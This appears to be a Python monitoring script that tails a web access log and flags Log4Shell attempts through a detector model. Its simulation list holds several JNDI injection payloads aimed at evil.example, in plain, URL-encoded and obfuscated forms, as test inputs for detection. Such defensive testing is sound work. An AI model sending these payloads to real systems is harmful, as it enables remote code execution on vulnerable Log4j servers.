#!/usr/bin/env python3
"""Monitor a log file and emit near-real-time Log4Shell alerts."""

from __future__ import annotations

import argparse
import json
import time
from datetime import datetime, timezone
from pathlib import Path

import _bootstrap  # noqa: F401

from detector.inference import ProductDetector
from detector.paths import RESULTS_DIR


SIM_LINES = [
    "GET /home HTTP/1.1",
    "GET /api/products?id=123 HTTP/1.1 Host: shop.local",
    "GET /?q=${jndi:ldap://evil.example/a} HTTP/1.1",
    "GET /?q=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D HTTP/1.1",
    "GET /?q=${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://evil.example/a} HTTP/1.1",
    "Security scanner report mentions \\${jndi:ldap://example.com/a} as text",
]


def _alert_payload(raw_log: str, result) -> dict[str, object]:
    return {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "label": result.label,
        "risk_score": result.score,
        "risk_level": result.risk_level,
        "raw_log": raw_log,
        "normalized_log": result.normalized_log,
        "detected_patterns": result.detected_patterns,
        "recommendation": "Inspect outbound LDAP/RMI/DNS traffic and verify Log4j patch status.",
    }


def _print_result(raw_log: str, result) -> None:
    status = "[OK]"
    if result.risk_level == "suspicious":
        status = "[SUSPICIOUS]"
    if result.risk_level == "critical":
        status = "[CRITICAL]"
    print(f"{status} score={result.score:.2f} {raw_log}")


def process_line(detector: ProductDetector, raw_log: str, output: Path) -> None:
    result = detector.predict(raw_log)
    _print_result(raw_log, result)
    if result.risk_level in {"suspicious", "critical"}:
        with output.open("a", encoding="utf-8") as handle:
            handle.write(json.dumps(_alert_payload(raw_log, result)) + "\n")


def follow_file(path: Path, detector: ProductDetector, output: Path) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.touch(exist_ok=True)
    with path.open("r", encoding="utf-8", errors="replace") as handle:
        handle.seek(0, 2)
        while True:
            line = handle.readline()
            if line:
                process_line(detector, line.strip(), output)
            else:
                time.sleep(0.5)


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--file", default="demo/logs/access.log")
    parser.add_argument("--output", default=str(RESULTS_DIR / "live_alerts.jsonl"))
    parser.add_argument("--simulate", action="store_true")
    args = parser.parse_args()
    output = Path(args.output)
    output.parent.mkdir(parents=True, exist_ok=True)
    detector = ProductDetector()
    if args.simulate:
        for line in SIM_LINES:
            process_line(detector, line, output)
            time.sleep(0.2)
        return
    follow_file(Path(args.file), detector, output)


if __name__ == "__main__":
    main()
